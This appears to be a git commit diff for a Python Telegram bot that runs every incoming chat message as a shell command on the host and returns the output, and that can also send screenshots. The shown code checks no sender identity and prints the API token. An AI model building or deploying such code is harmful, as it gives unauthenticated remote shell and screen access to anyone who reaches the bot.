f5b312517f2c5049e929029484b6092e9b2c588c
Aman Verasia <amanverasia@Amans-MacBook-Air.local>
2023-07-25 12:31:21 +0530

    Added barebones functionality

--- main.py
+++ main.py
@@ -11,11 +11,16 @@ try:
     # Iterate over the modules to install them using pip
     for module in modules_to_install:
         subprocess.check_call(['pip', 'install', module])
+except:
+    print('Try again? Maybe with internet?')
+
+#Importing Modules
+try:
     import pyautogui
     from telegram import Update
     from telegram.ext import filters, MessageHandler, ApplicationBuilder, CommandHandler, ContextTypes
 except:
-    print('Try again? Maybe with internet?')
+    print('Issues with module import')
 
 #logging all the data for now, will remove it in future additions
 logging.basicConfig(
@@ -44,9 +49,37 @@ async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(screenshot_path, 'rb'))
 
     #delte the screenshot
-    if os.path.exists(file_path):
-        os.remove(file_path)
+    if os.path.exists(screenshot_path):
+        os.remove(screenshot_path)
 
 #Defining our echo function that takes care of all the messages
 async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    pass
+    #This is to run the command in the shell
+    output = subprocess.check_output(update.message.text, shell=True).decode('utf-8')
+
+    #Printing out the output for debug purposes
+    print(output)
+    #TODO - The functionality to send long text
+    #If the output is empty send the response as "no output"
+    if(output):
+        await context.bot.send_message(chat_id=update.effective_chat.id, text=output)
+    else:
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="no output")
+
+if __name__ == '__main__':
+    #Api_Key goes here
+    with open('token.txt', 'r') as fh:
+        api_token = fh.read().strip()
+        print(api_token)
+    application = ApplicationBuilder().token(api_token).build()
+
+    #starting the function
+    echo_handler = MessageHandler(filters.TEXT & (~filters.COMMAND), echo)
+    start_handler = CommandHandler('start', start)
+    screenshot_handler = CommandHandler('screenshot', screenshot)
+
+    application.add_handler(start_handler)
+    application.add_handler(echo_handler)
+    application.add_handler(screenshot_handler)
+    
+    application.run_polling()
